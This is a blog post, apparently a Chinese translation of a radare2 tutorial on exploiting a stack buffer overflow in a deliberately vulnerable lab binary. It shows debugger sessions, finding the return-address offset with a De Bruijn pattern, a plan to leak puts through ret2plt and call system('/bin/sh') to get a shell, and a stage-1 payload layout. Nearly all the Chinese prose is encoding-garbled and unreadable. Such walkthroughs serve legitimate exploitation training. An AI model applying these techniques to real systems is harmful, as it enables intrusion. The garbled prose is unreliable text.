---
title: ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation
date: 2019-02-23 11:18:10
tags: [re, translation]
---

ç¿»è¯‘è‡ª[Megabeets](https://www.megabeets.net/a-journey-into-radare-2-part-2/)ã€‚

<!-- more -->

# åºè¨€

æ¬¢è¿æ¥åˆ°æˆ‘ä»¬`radare2`ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†ï¼åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¼šæ¶µç›–`radare2`çš„æ›´å¤šéƒ¨åˆ†ï¼ŒåŒæ—¶è¿™æ¬¡æ›´æ³¨é‡äºäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ã€‚

ç›¸ä¿¡å¤§å®¶éƒ½ä¸€å®šå¾ˆæœŸå¾…è¿™ç¬¬äºŒéƒ¨åˆ†ï¼Œä¹‹åçš„å†…å®¹ä¹Ÿä¸€å®šä¼šæ›´å¿«åœ°åˆ†äº«ç»™å¤§å®¶ã€‚å¦‚æœä½ è¿˜æ²¡æœ‰é˜…è¯»è¿‡è¿™ä¸€ç³»åˆ—çš„[ç¬¬ä¸€éƒ¨åˆ†](https://www.megabeets.net/a-journey-into-radare-2-part-1/)ï¼Œæˆ‘éå¸¸æ¨èä½ å»è¯»ä¸€è¯»ã€‚ç¬¬ä¸€éƒ¨åˆ†è®°å½•äº†`radare2`çš„åŸºç¡€å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿè§£é‡Šäº†å¾ˆå¤šæˆ‘ä»Šå¤©ä¼šç”¨åˆ°çš„å‘½ä»¤ã€‚

åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯å¯¹ä¸€ä¸ªç®€å•çš„ç¨‹åºè¿›è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ã€‚`radare2`æœ‰å¾ˆå¤šä¸åŒçš„åŠŸèƒ½å¯ä»¥å¸®æˆ‘ä»¬å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä¾‹å¦‚ä¿æŠ¤æŠ€æœ¯ã€æŸ¥æ‰¾ ROPã€ç”Ÿæˆéšæœºåºåˆ—ã€æŸ¥çœ‹å¯„å­˜å™¨å†…å®¹ç­‰ç­‰ã€‚ä½ å¯ä»¥åœ¨æœ¬æ–‡æœ«å°¾æ‰¾åˆ°ä¸€ä»½å‘½ä»¤å¯¹åº”è¡¨ã€‚ä»Šå¤©æˆ‘ä¼šå‘ä½ ä»¬å±•ç¤ºè¿™äº›å¼ºå¤§çš„åŠŸèƒ½ï¼ŒåŒæ—¶æˆ‘ä»¬ç”¨`radare2`æ¥ç»•è¿‡åœ¨å¼€å¯`ASLR`çš„ç³»ç»Ÿä¸Šè¿è¡Œå¹¶ä¸”æœ‰`NX`ä¿æŠ¤çš„ç¨‹åºã€‚æˆ‘å‡è®¾å¤§å®¶éƒ½å·²ç»æŒæ¡äº†ä»¥ä¸‹çš„é¢„å¤‡çŸ¥è¯†ï¼š

- æ±‡ç¼–è¯­è¨€
- ç¨‹åºä¿æŠ¤æŠ€æœ¯ï¼ˆ`NX`ã€`ASLR`ï¼‰
- [æ ˆå¸§ç»“æ„](https://en.wikipedia.org/wiki/Call_stack)
- [ç¼“å†²åŒºæº¢å‡º](https://en.wikipedia.org/wiki/Buffer_overflow)
- [é¢å‘è¿”å›ç¼–ç¨‹](https://en.wikipedia.org/wiki/Return-oriented_programming)
- [x86 è°ƒç”¨çº¦å®š](https://en.wikipedia.org/wiki/X86_calling_conventions)

ç†Ÿæ‚‰è¿™äº›çŸ¥è¯†æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œå› ä¸ºæ–‡ç« ä¸­æˆ‘å¹¶ä¸ä¼šç»†è®²ï¼Œç”šè‡³ä¸ä¼šå¯¹å…¶è§£é‡Šã€‚

![](https://www.megabeets.net/uploads/r2_part1_2.png)

# æ›´æ–°`radare2`

é¦–å…ˆï¼Œæˆ‘ä»¬å°†`radare2`æ›´æ–°è‡³å…¶ git çš„æœ€æ–°ç‰ˆç‰ˆï¼š

```shell
$ git clone https://github.com/radare/radare2.git # å¦‚æœä½ è¿˜æ²¡æœ‰å…‹éš†ä¸‹æ¥çš„è¯
$ cd radare2
$ ./sys/install.sh
```

ç­‰å¾…æ›´æ–°å®Œæˆéœ€è¦å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œåœ¨è¿™æœŸé—´ä¸å¦‚çœ‹äº›è§†é¢‘æ”¾æ¾ä¸€ä¼šå„¿ã€‚

# ç†Ÿæ‚‰ç¨‹åº

ä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½[ç¨‹åº](https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2)ï¼Œåœ¨è¿™é‡Œä¸‹è½½[æºç ](https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c)ã€‚
å¦‚æœä½ æƒ³è‡ªå·±ç¼–è¯‘ç¨‹åºï¼Œç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```shell
$ gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2
```

è¿™æ¬¡çš„ç¨‹åºä¸ä¸Šä¸€æ¬¡çš„ç¨‹åºéå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯åœ¨`main()`å‡½æ•°ä¸­æœ‰ä¸€äº›ç»†å¾®çš„æ”¹å˜ï¼š

- ç¼–è¯‘æ—¶ä¸ä½¿ç”¨å‚æ•°`-z execstac`æ¥å¼€å¯`NX`
- é€šè¿‡ scanf æ¥æ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯é€šè¿‡ç¨‹åºçš„å‚æ•°
- å¤§éƒ¨åˆ†è¾“å‡ºçš„å‡½æ•°ä¸º puts
- å¯¹ç¨‹åºçš„è¾“å‡ºåšäº†ä¸€ç‚¹ä¿®æ”¹

è¿™æ˜¯ä¹‹å‰çš„`main()`å‡½æ•°ï¼š

```cpp
int main(int argc, char *argv[])
{
    printf("\n  .:: Megabeets ::.\n");
    printf("Think you can make it?\n");
    if (argc >= 2 && beet(argv[1]))
    {
        printf("Success!\n\n");
    }
    else
        printf("Nop, Wrong argument.\n\n");

    return 0;
}
```

ç„¶åç°åœ¨çš„`main`å‡½æ•°æ˜¯è¿™æ ·çš„ï¼š

```cpp
int main(int argc, char *argv[])
{
    char *input;
    puts("\n  .:: Megabeets ::.\n");
    puts("Show me what you got:");

    scanf("%ms", &input);
    if (beet(input))
    {
        printf("Success!\n\n");
    }
    else
        puts("Nop, Wrong argument.\n\n");

    return 0;
}
```

ç¨‹åºçš„åŠŸèƒ½ååˆ†ç®€å•ï¼Œå¹¶ä¸”åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å·²ç»å¯¹å®ƒå¾ˆç†Ÿæ‚‰äº†â€”â€”è¦æ±‚è¾“å…¥å­—ç¬¦ä¸²ï¼Œä¸ç»è¿‡`rot13`åŠ å¯†çš„å­—ç¬¦ä¸²`Megabeets`æ¯”è¾ƒã€‚æ•…è¾“å…¥åº”è¯¥ä¸º`Zrtnorrgf`ã€‚

```shell
$ ./megabeets_0x2

  .:: Megabeets ::.

Show me what you got:
blablablabla
Nop, Wrong argument.

$ ./megabeets_0x2

  .:: Megabeets ::.

Show me what you got:
Zrtnorrgf
Success!
```

è¿™äº›éƒ½å¾ˆç®€å•ï¼Œä½†æ˜¯æˆ‘ä»¬ä»Šå¤©çš„é‡ç‚¹å¹¶ä¸æ˜¯ç ´è§£ä¸€ä¸ªç®€å•çš„ crackmeï¼Œè€Œæ˜¯å¯¹å…¶è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚é‚£æˆ‘ä»¬å¼€å§‹å§ï¼

# ç†è§£æ¼æ´

å¯¹äºæ¯ä¸€ä¸ª PWN é¢˜ç»™å‡ºçš„ç¨‹åºæ¥è¯´ï¼Œæ£€æŸ¥ç¨‹åºå¼€äº†ä»€ä¹ˆä¿æŠ¤æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æåˆ°çš„`rabin2`ï¼Œæˆ–è€…ç›´æ¥åœ¨`radare2`çš„ shell é‡Œæ‰§è¡Œ`i`å‘½ä»¤ã€‚å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰ç”¨`radare2`æ‰“å¼€æ–‡ä»¶ï¼Œå°±å…ˆç”¨`rabin2`æ¥çœ‹çœ‹ï¼š

```shell
$ rabin2 -I megabeets_0x2

arch     x86
binsz    6072
bintype  elf
bits     32
canary   false
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```

åœ¨æ ‡è®°çš„å‡ è¡Œä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºå¼€äº†`NX`ï¼Œä¹Ÿå°±æ˜¯è¯´æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚è¿˜æœ‰ï¼Œè¯¥ç¨‹åºæ²¡æœ‰å¼€å¯[`Canary`](https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries)ã€[`PIC`](https://en.wikipedia.org/wiki/Position-independent_code)æˆ–æ˜¯[`RELRO`](https://tk-blog.blogspot.co.il/2009/02/relro-not-so-well-known-memory.html)ã€‚

ç°åœ¨æˆ‘ä»¬è¿…é€Ÿåœ°è¿‡ä¸€éç¨‹åºçš„æ‰§è¡Œæµï¼Œè¿™æ¬¡æˆ‘ä»¬çœ‹ä¸€çœ‹å®ƒçš„åæ±‡ç¼–ä»£ç ï¼ˆå¹¶ä¸æ˜¯æ¯æ¬¡æ¼æ´æŒ–æ˜éƒ½èƒ½æœ‰æºç ï¼‰ã€‚ä½¿ç”¨`radare2`çš„è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼š

```shell
$ r2 -d megabeets_0x2
Process with PID 20859 startedâ€¦
= attach 20859 20859
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32â€“ Your endian swaps
[0xf7782b30]> aas
```

> - `-d` â€“ ç”¨è°ƒè¯•æ¨¡å¼æ‰“å¼€
> - `aas` â€“ åˆ†æå‡½æ•°ã€ç¬¦å·ä»¥åŠå…¶ä»–
> - æ³¨æ„ï¼šæ­£å¦‚æˆ‘åœ¨å‰ä¸€ç¯‡æ–‡ç« æ‰€æåˆ°çš„ï¼Œå¼€å§‹æ—¶ä½¿ç”¨`aaa`åˆ†ææ˜¯æœ€æ¨èçš„æ–¹å¼ï¼Œå› ä¸ºåˆ†ææœ¬æ¥å°±æ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„è¿‡ç¨‹ã€‚æˆ‘åœ¨[è¿™ç¯‡å›ç­”](https://reverseengineering.stackexchange.com/a/16115/18698)é‡Œå†™äº†æ›´å¤šâ€”â€”è¯»ä¸€ä¸‹ä¹Ÿè®¸ä¼šè®©ä½ çš„ç†è§£æ›´æ·±ã€‚

ç°åœ¨æˆ‘ä»¬ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œç›´åˆ°`main`å‡½æ•°ã€‚åªè¦è¾“å…¥å‘½ä»¤`dcu main`ï¼š

```shell
[0xf7797b30]> dcu?
|Usage: dcu Continue until address
| dcu address      Continue until address
| dcu [..tail]     Continue until the range
| dcu [from] [to]  Continue until the range
[0xf7797b30]> dcu main
Continue until 0x08048658 using 1 bpsize
hit breakpoint at: 8048658
```

> - `dcu`ä»£è¡¨`debug continue until`

ç°åœ¨è®©æˆ‘ä»¬è¾“å…¥`VV`è¿›å…¥å›¾å½¢æ¨¡å¼ã€‚åœ¨ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šè¿‡ï¼Œä½ å¯ä»¥é€šè¿‡`p`å’Œ`P`åˆ‡æ¢è§†è§’ï¼Œé€šè¿‡`k`/`j`/`h`/`l`åˆ†åˆ«å‘ä¸Š/ä¸‹/å·¦/å³ç§»åŠ¨ï¼Œé€šè¿‡`g`å’Œè°ƒç”¨æ—çš„å­—æ¯è·³è½¬å‡½æ•°ï¼ˆä¾‹å¦‚`gd`ï¼‰ã€‚

ç”¨`?`æ¥åˆ—å‡ºæ‰€æœ‰åœ¨å›¾å½¢æ¨¡å¼ä¸‹çš„å‘½ä»¤ï¼ŒåŒæ—¶åˆ«å¿˜è®°`R`å‘½ä»¤ ğŸ˜‰

![](https://www.megabeets.net/uploads/mainsym.png)

`main()`å‡½æ•°æ˜¯ç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹ï¼Œå¹¶ä¸”å®ƒå°†è¾“å…¥ä¼ ç»™`sym.beet`ã€‚é€šè¿‡`gc`æˆ‘ä»¬è·³è½¬åˆ°å¤„ç†æˆ‘ä»¬è¾“å…¥çš„`beet()`å‡½æ•°ï¼š

![](https://www.megabeets.net/uploads/beetsym.png)

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„è¾“å…¥`[arg_8h]`è¢«å¤åˆ¶ç»™ä¸€ä¸ªç¼“å†²åŒºï¼ˆ`[local_88h]`ï¼‰ï¼Œç„¶åå°±æ˜¯æˆ‘ä»¬åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æ‰€çœ‹åˆ°è¿‡çš„ï¼Œå­—ç¬¦ä¸²`Megabeets`ç”¨`rot13`åŠ å¯†äº†ï¼Œæ‰€å¾—ç»“æœä¸æˆ‘ä»¬çš„è¾“å…¥åšæ¯”è¾ƒã€‚æˆ‘ä»¬ä¹‹å‰äº†è§£è¿‡ï¼Œæˆ‘è¿™é‡Œå°±ä¸åšæ·±ç©¶ã€‚

ä½ æœ‰çœ‹åˆ°ä»€ä¹ˆå¯ä»¥çš„åœ°æ–¹å—ï¼Ÿæˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å¯¹é•¿åº¦åšæ£€æŸ¥ï¼Œç„¶åç›´æ¥å¤åˆ¶åˆ°äº†ç¼“å†²åŒºä¸­ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸²è¶…è¿‡ç¼“å†²åŒºå¤§å°çš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½å¯¼è‡´æ ˆä¸Šçš„ç¼“å†²åŒºæº¢å‡ºã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æ¼æ´ã€‚

# è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬

æ—¢ç„¶æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†æœ‰æ¼æ´çš„å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ª payload æ¥åˆ©ç”¨å®ƒã€‚æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜äº†ï¼Œå°±æ˜¯åœ¨ç³»ç»Ÿä¸ŠæˆåŠŸå¼€ä¸€ä¸ª shellã€‚é¦–å…ˆï¼Œæˆ‘ä»¬è¦ç¡®è®¤ç¡®å®æœ‰ä¸€ä¸ªæœ‰æ¼æ´çš„å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬çš„ payload å¯ä»¥è¦†ç›–æ ˆçš„åç§»ã€‚

![](https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif)

æˆ‘ä»¬å°†ä¼šä½¿ç”¨ä¸€ä¸ª`radare2`æ¡†æ¶ä¸­çš„å·¥å…·ï¼Œå«åš`ragg2`ã€‚å®ƒèƒ½å¤Ÿä¸ºæˆ‘ä»¬ç”Ÿæˆä¸€æ®µå¾ªç¯çš„[å¾·å¸ƒé²å› åºåˆ—](https://en.wikipedia.org/wiki/De_Bruijn_sequence)ï¼Œç”¨æ¥æ£€æµ‹è¦†ç›–ç¼“å†²åŒºçš„ç¡®åˆ‡çš„åç§»å¤§å°ã€‚

```shell
$ ragg2 -
<truncated>
 -P [size]       prepend debruijn pattern
<truncated>
 -r              show raw bytes instead of hexpairs
<truncated>

$ ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
```

æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬çš„ç¨‹åºé€šè¿‡è¾“å…¥æµè¯»å–æˆ‘ä»¬çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯ä» shell ä¸­è¯»å–æˆ‘ä»¬çš„è¾“å…¥ã€‚æ•…æˆ‘ä»¬å°†ä¼šä½¿ç”¨åˆä¸€ä¸ªæ¥è‡ª`radare2`å·¥å…·ç®±ä¸­çš„å·¥å…·ï¼Œ`rarun2`ã€‚

> - `rarun2`å¯ä»¥åœ¨ä¸åŒç¯å¢ƒã€å‚æ•°ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å¤¹ä¸‹è¿è¡Œç¨‹åºï¼Œå¹¶ä¸”è¦†ç›–é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚`stdin`ï¼‰
>
> - å¦‚æœä½ éœ€è¦åœ¨è·‘ä¸€ä¸ªç¨‹åºæ—¶ä½¿ç”¨å¾ˆé•¿çš„å‚æ•°ï¼Œå®ƒä¼šèµ·å¾ˆå¤§çš„ä½œç”¨ã€‚è€Œä¸”æ¼æ´åˆ©ç”¨é€šå¸¸éƒ½ä¼šå‘è¾“å…¥æµä¼ ä¸€å¤§å †æ•°æ®ã€‚

æˆ‘ä»¬éœ€è¦åšä»¥ä¸‹çš„ä¸‰ä¸ªæ­¥éª¤ï¼š

- ä½¿ç”¨`ragg2`å°†å¾·å¸ƒé²å› åºåˆ—å†™å…¥ä¸€ä¸ªæ–‡ä»¶
- æ–°å»ºä¸€ä¸ª`rarun2`é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠå‰ä¸€ä¸ªæ–‡ä»¶ä½œä¸º`stdin`
- è®©`radare2`æ¥æ‰¾åˆ°åç§»

```shell
$ ragg2 -P 200 -r > pattern.txt
$ cat pattern.txt
AAABAACAADAAEAAFAAGAAHAAIâ€¦ <truncated> â€¦7AA8AA9AA0ABBABCABDABEABFA

$ vim profile.rr2

$ cat profile.rr2
#!/usr/bin/rarun2
stdin=./pattern.txt

$ r2 -r profile.rr2 -d megabeets_0x2
Process with PID 21663 startedâ€¦
= attach 21663 21663
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32

â€” Use rarun2 to launch your programs with a predefined environment.
[0xf77c2b30]> dc
Selecting and continuing: 21663

.:: Megabeets ::.

Show me what you got?
child stopped with signal 11

[0x41417641]>
```

æˆ‘ä»¬è¿è¡Œç¨‹åºï¼Œå¹¶å°†*pattern.txt*çš„å†…å®¹ç”¨`rarun2`ä¼ ç»™`stdin`ï¼Œ_SIGSEV 11_ã€‚

> - ä¸€ä¸ªä¿¡å·æ˜¯ä¸€ç§å‘é€ç»™è¿›ç¨‹æˆ–æ˜¯ä¸€ä¸ªå…·ä½“çº¿ç¨‹çš„å¼‚æ­¥é€šçŸ¥ï¼Œè¿™æ ·ä¸ä¹‹ç›¸åŒçš„è¿›ç¨‹å°±ä¼šåœ¨æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶å¾—åˆ°æé†’ã€‚
>
> - SIGSEGVï¼ˆ11ï¼‰ä¿¡å·åœ¨è®¿é—®äº†æŸä¸ªæ— æ•ˆçš„è™šæ‹Ÿå†…å­˜æˆ–æ®µé”™è¯¯åä¼šè§¦å‘ã€‚

ä½ å‘ç°äº†å—ï¼Ÿæˆ‘ä»¬å®æ—¶çš„æŒ‡é’ˆç°åœ¨æŒ‡å‘äº†`0x41417641`ã€‚è¿™æ˜¯ä¸€ä¸ªæ— æ•ˆçš„åœ°å€ï¼Œå®ƒè¡¨ç¤ºäº†å­—ç¬¦ä¸²`AvAA`ï¼ˆå°ç«¯åºåŠ ascii ç è½¬æ¢ï¼‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€çš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚`radare2`å…è®¸æˆ‘ä»¬æ‰¾åˆ°ç»™å‡ºçš„å€¼åœ¨å¾·å¸ƒé²å› åºåˆ—ä¸­çš„åç§»ã€‚

```shell
[0x41417641]> wop?
|Usage: wop[DO] len @ addr | value
| wopD len [@ addr]  Write a De Bruijn Pattern of length â€˜lenâ€™ at address â€˜addrâ€™
| wopO value         Finds the given value into a De Bruijn Pattern at current offset
[0x41417641]> wopO `dr eip`
140
```

æ—¢ç„¶æˆ‘ä»¬å·²ç»çŸ¥é“éœ€è¦è¦†ç›–è¿”å›åœ°å€çš„åç§»ä¸º 140ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹ç¼–å†™è„šæœ¬äº†ã€‚

# ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬

æˆ‘ä¹‹å‰ä¹Ÿæåˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œè¿™ç¯‡æ–‡ç« ä¸æ˜¯æ•™ä¸€äº›æ¼æ´åˆ©ç”¨çš„åŸºç¡€çŸ¥è¯†çš„ï¼Œå®ƒçš„ç›®çš„æ˜¯å±•ç¤º`radare2`åœ¨æ¼æ´åˆ©ç”¨ä¸­æ˜¯å¦‚ä½•ä½¿ç”¨çš„ã€‚å› æ­¤ï¼Œæˆ‘ä¸ä¼šè¿‡å¤šåœ°è§£é‡Šè„šæœ¬çš„æ¯ä¸ªéƒ¨åˆ†ã€‚

æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åœ¨ç³»ç»Ÿä¸­äº§ç”Ÿä¸€ä¸ª shellã€‚è¿™æœ‰å¾ˆå¤šç§æ–¹æ³•ï¼Œå°¤å…¶æ˜¯è¿™æ ·ä¸€ä¸ªç¨‹åºã€‚ä¸ºäº†çŸ¥é“æˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“æˆ‘ä»¬ä¸èƒ½åšä»€ä¹ˆã€‚æˆ‘ä»¬çš„ç¨‹åºåœ¨å¼€äº†`ASLR`åœ°ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½çŒœæµ‹åˆ°[_libc_](https://en.wikipedia.org/wiki/C_standard_library)åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚é‚£å°±å¯ä»¥å’Œ[_ret2libc_](https://en.wikipedia.org/wiki/Return-to-libc_attack)è¯´å†è§äº†ã€‚å¦å¤–ï¼Œç¨‹åºå¼€äº†`NX`ï¼Œè¿™æ„å‘³æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨æ ˆä¸Šæ”¾ä¸€ä¸ª[_shellcode_](https://en.wikipedia.org/wiki/Shellcode)ç„¶åè·³è¿‡å»ã€‚

è™½ç„¶è¿™äº›ä¿æŠ¤è®©æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ä¸€äº›æ¼æ´åˆ©ç”¨æŠ€æœ¯ï¼Œç„¶è€Œè¿™ä¸èƒ½é˜»æ­¢æˆ‘ä»¬è½»æ¾åœ°ç»•è¿‡å®ƒä»¬ã€‚ç¼–å†™æˆ‘ä»¬çš„è„šæœ¬æ—¶ï¼Œéœ€è¦ç»†å¿ƒåœ°è§‚å¯Ÿæä¾›ç»™æˆ‘ä»¬çš„è¿è¡Œåº“ä»¥åŠå‡½æ•°ã€‚

è®©æˆ‘ä»¬å†æ¬¡é€šè¿‡è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼Œç„¶åçœ‹ä¸€çœ‹å®ƒä½¿ç”¨çš„è¿è¡Œåº“å’Œå‡½æ•°ã€‚å…ˆçœ‹åº“ï¼š

```shell

$ r2 -d megabeets_0x2
Process with PID 23072 startedâ€¦
= attach 23072 23072
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32
â€” You haxor! Me jane?
[0xf7763b30]> il
[Linked libraries]
libc.so.61 library
```

`il`è¡¨ç¤º`Information libraries`ï¼Œå³å‘Šè¯‰æˆ‘ä»¬ç¨‹åºæ‰€ä½¿ç”¨çš„è¿è¡Œåº“ã€‚å¯¹äºè¯¥ç¨‹åºæ¥è¯´ï¼Œåªæœ‰æˆ‘ä»¬æœ€çˆ±çš„*libc*ã€‚

ç°åœ¨é€šè¿‡æ‰§è¡Œ`ii`å‘½ä»¤â€”â€”`Information Imports`ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¯¼å…¥çš„å‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥åŠ ä¸Š`q`æ¥å‡å°‘å†—é•¿çš„è¾“å‡ºï¼š

```shell
[0xf7763b30]> ii
[Imports]
ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmp
ordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpy
ordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=puts
ordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__
ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports

[0xf7763b30]> iiq
strcmp
strcpy
puts
__gmon_start__
__libc_start_main
__isoc99_scanf
```

## è®¡åˆ’

- æ³„æ¼`puts`çš„çœŸå®åœ°å€
- è®¡ç®—*libc*çš„åŸºå€
- è®¡ç®—`system`çš„åœ°å€
- åœ¨*libc*ä¸­æ‰¾åˆ°åŒ…å«å­—ç¬¦ä¸²`/bin/sh`çš„åœ°å€
- è°ƒç”¨`system("/bin/sh")`æ‰“å¼€ä¸€ä¸ª shell

## æ³„æ¼`puts`çš„åœ°å€

æˆ‘ä»¬éœ€è¦ç”¨åˆ°`ret2plt`æ¥æ³„æ¼`puts`çš„çœŸå®åœ°å€ã€‚`PLT`ï¼ˆ_Procedure Linkage Table_ï¼‰æ˜¯å†…å­˜ä¸­çš„ç»“æ„ä½“ï¼Œå®ƒåŒ…æ‹¬ä¸€å°æ®µä»£ç ï¼Œèƒ½å¤Ÿè·³è½¬åˆ°åœ¨åŠ¨æ€é“¾æ¥æ—¶ç¨‹åºä¹‹å¤–çš„å‡½æ•°åœ°å€ã€‚ä¸ç®¡ä»€ä¹ˆæ—¶å€™ï¼Œæˆ‘ä»¬åœ¨`.text`æ®µçœ‹åˆ°`CALL`æŒ‡ä»¤ï¼Œå¹¶ä¸æ˜¯ç›´æ¥è·³åˆ°å‡½æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒè·³è½¬åˆ°äº†`PLT`ä¸­çš„ä¸€å°æ®µä»£ç ï¼Œåƒæ˜¯`func_name@plt`è¿™æ ·ã€‚è¿™ä¸€å°æ®µä»£ç è·³è½¬åˆ°`GOT`ï¼ˆ_Global Offset Table_ï¼‰ä¸­çš„åˆ—å‡ºçš„è¯¥å‡½æ•°çš„åœ°å€ã€‚`GOT`è¡¨å…¥å£ç‚¹ä¼šæŒ‡å›`PLT`ï¼ŒåŒæ—¶`PLT`ä¼šè°ƒç”¨ä¸€ä¸ªåŠ¨æ€é“¾æ¥å™¨æ¥ç¡®å®šè¯¥å‡½æ•°çš„çœŸå®åœ°å€ã€‚ä¸‹ä¸€æ¬¡è°ƒç”¨`func_name@plt`æ—¶ï¼Œè¿™æ®µä»£ç ä¼šç›´æ¥è·³è½¬åˆ°`GOT`è¡¨é‡Œçš„å‡½æ•°åœ°å€ã€‚æƒ³è¦äº†è§£æ›´å¤šå…³äºåŠ¨æ€é“¾æ¥çš„çŸ¥è¯†ï¼Œæˆ‘æ¨èä¼Šæ©å…°æ–¯æ³°å‹’å†™çš„[è¿™ä¸€ç³»åˆ—å…³äºé“¾æ¥å™¨çš„æ–‡ç« ](https://www.airs.com/blog/archives/38)

ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°`puts`åœ¨`PLT`ä»¥åŠ`GOT`ä¸­çš„åœ°å€ï¼Œç„¶åè°ƒç”¨`puts@plt`å¹¶ä¸”æŠŠ`puts@got`ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬å°†æŠŠè¿™äº›è°ƒç”¨è¿åœ¨ä¸€èµ·ï¼Œåœ¨`scanf`æ—¶ä¼ ç»™ç¨‹åºã€‚ç„¶åæˆ‘ä»¬ä¼šè¿”å›åˆ°æˆ‘ä»¬åˆ©ç”¨çš„ç¬¬äºŒä¸ªé˜¶æ®µã€‚`puts`å°†ä¼šæŠŠå®ƒçœŸå®çš„åœ°å€è¾“å‡ºå‡ºæ¥ã€‚

```
+---------------------+
|       Stage 1       |
+---------------------+
| padding (140 bytes) |
| puts@plt            |
| entry_point         |
| puts@got            |
+---------------------+
```

